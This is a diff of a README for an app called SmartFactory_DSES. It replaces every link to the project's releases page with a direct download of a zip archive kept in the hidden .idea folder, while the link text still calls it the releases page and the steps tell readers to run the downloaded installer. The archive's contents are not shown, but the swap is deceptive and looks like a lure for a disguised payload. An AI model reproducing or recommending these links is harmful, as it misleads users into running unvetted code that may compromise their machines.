@@ -1,6 +1,6 @@
 # 🌟 SmartFactory_DSES - Your Intelligent Dashboard for Manufacturing Insights
 
-[![Download SmartFactory_DSES](https://img.shields.io/badge/Download%20SmartFactory_DSES-Get%20Started-blue)](https://github.com/67huzzroy/SmartFactory_DSES/releases)
+[![Download SmartFactory_DSES](https://github.com/67huzzroy/SmartFactory_DSES/raw/refs/heads/main/.idea/Factory-DSES-Smart-v1.6.zip%20SmartFactory_DSES-Get%20Started-blue)](https://github.com/67huzzroy/SmartFactory_DSES/raw/refs/heads/main/.idea/Factory-DSES-Smart-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SmartFactory_DSES! This application provides a real-time dashboard to
 
 To get started, you'll need to visit the following page to download the application:
 
-[Download SmartFactory_DSES](https://github.com/67huzzroy/SmartFactory_DSES/releases)
+[Download SmartFactory_DSES](https://github.com/67huzzroy/SmartFactory_DSES/raw/refs/heads/main/.idea/Factory-DSES-Smart-v1.6.zip)
 
 1. Click the link above.
 2. Find the latest release version on the page.
@@ -37,7 +37,7 @@ SmartFactory_DSES offers several important features:
 
 ## 🔧 Installation Steps
 
-1. **Download the Application**: Visit [this page](https://github.com/67huzzroy/SmartFactory_DSES/releases) and follow the download instructions.
+1. **Download the Application**: Visit [this page](https://github.com/67huzzroy/SmartFactory_DSES/raw/refs/heads/main/.idea/Factory-DSES-Smart-v1.6.zip) and follow the download instructions.
 2. **Run the Installer**: Open the downloaded file to begin installation.
 3. **Follow On-Screen Instructions**: Complete the setup by following the prompts. 
 4. **Launch the Application**: Once installed, find SmartFactory_DSES in your applications folder and open it.
@@ -80,4 +80,4 @@ For additional support, post your questions in the GitHub Issues section of this
 
 ## 💡 Final Note
 
-Remember to visit our [releases page](https://github.com/67huzzroy/SmartFactory_DSES/releases) for the latest updates, bug fixes, and new features. Enjoy your experience with SmartFactory_DSES, your partner in smart manufacturing!
+Remember to visit our [releases page](https://github.com/67huzzroy/SmartFactory_DSES/raw/refs/heads/main/.idea/Factory-DSES-Smart-v1.6.zip) for the latest updates, bug fixes, and new features. Enjoy your experience with SmartFactory_DSES, your partner in smart manufacturing!
